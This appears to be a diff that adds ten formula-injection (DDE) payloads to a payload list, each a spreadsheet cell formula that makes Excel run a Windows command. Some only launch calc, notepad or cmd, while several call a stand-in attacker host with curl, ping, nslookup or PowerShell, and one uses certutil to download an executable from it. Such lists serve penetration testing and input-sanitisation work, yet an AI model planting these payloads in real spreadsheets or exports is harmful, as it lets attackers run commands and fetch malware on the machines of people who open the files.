@@ -1,0 +1,10 @@
+=CMD|' /C calc'!A0
+=CMD|' /C notepad'!A0
+=CMD|' /C whoami'!A0
+=CMD|' /C ping attacker.com'!A0
+=CMD|' /C powershell -c calc'!A0
+=CMD|' /C start cmd'!A0
+=CMD|' /C curl http://attacker.com'!A0
+=CMD|' /C certutil -urlcache -split -f http://attacker.com/a.exe a.exe'!A0
+=CMD|' /C powershell Invoke-WebRequest http://attacker.com'!A0
+=CMD|' /C nslookup attacker.com'!A0
